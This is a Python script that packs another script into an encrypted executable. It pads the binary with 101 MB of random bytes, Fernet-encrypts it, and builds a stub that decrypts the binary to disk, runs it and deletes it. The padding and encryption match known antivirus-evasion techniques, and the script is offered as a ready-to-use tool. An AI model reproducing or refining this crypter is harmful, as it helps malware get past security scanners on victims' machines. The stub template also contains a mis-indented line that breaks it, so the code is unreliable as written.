import os, shutil
import base64
import subprocess
import sys
from cryptography.fernet import Fernet

def create_exe(file):
    subprocess.run(f"pyinstaller --onefile --windowed --log-level=WARN {file}",
                    shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE) 
    
    base_file = file.split(".")[0]
    os.remove(base_file + '.spec')
    # os.remove(file + '.py')
    
    shutil.move(f'./dist/{base_file}', f'./{base_file}')
    os.rmdir('dist')
    shutil.rmtree('build')

def main():
    file_script = sys.argv[1]
    create_exe(file_script)
    file = f'{file_script.split(".")[0]}'
    file_dir = os.path.dirname(file)
    file_name = os.path.basename(file)

    padding_size = 1024 * 1024 * 101
    padding = os.urandom(padding_size)

    output_script = f'{file_name.split(".")[0]}'

    with open(output_script, "rb") as f:
        binary_data = f.read()
    os.remove(file)
    
    fernet_key = Fernet.generate_key()
    fernet = Fernet(fernet_key)
    encrypted_data = fernet.encrypt(binary_data + padding)
    encoded_fernet_key = base64.b64encode(fernet_key)

    script_template = f"""
import base64, subprocess, os
from cryptography.fernet import Fernet

def decrypt():
    
    fernet_key = base64.b64decode({encoded_fernet_key}).decode()
    encrypted_data = {encrypted_data}

    fernet = Fernet(fernet_key)

    file = "{file_dir}decryped_{file_name}"
    print("file to execute:", file)
    with open(file, "wb") as f:
        f.write(fernet.decrypt(encrypted_data)[:-{padding_size}])
     try:
        subprocess.run(["./"+file])
    except Exception as e:
        print("Failed to execute the file due to:", e)
    finally:
        os.remove(file)
decrypt()
"""
    with open(output_script+'_enc.py', "w") as f:
        f.write(script_template)
    create_exe(output_script+'_enc.py')
    print(f"Successfully encrypted {file_name}")

if __name__ == "__main__":
    main()
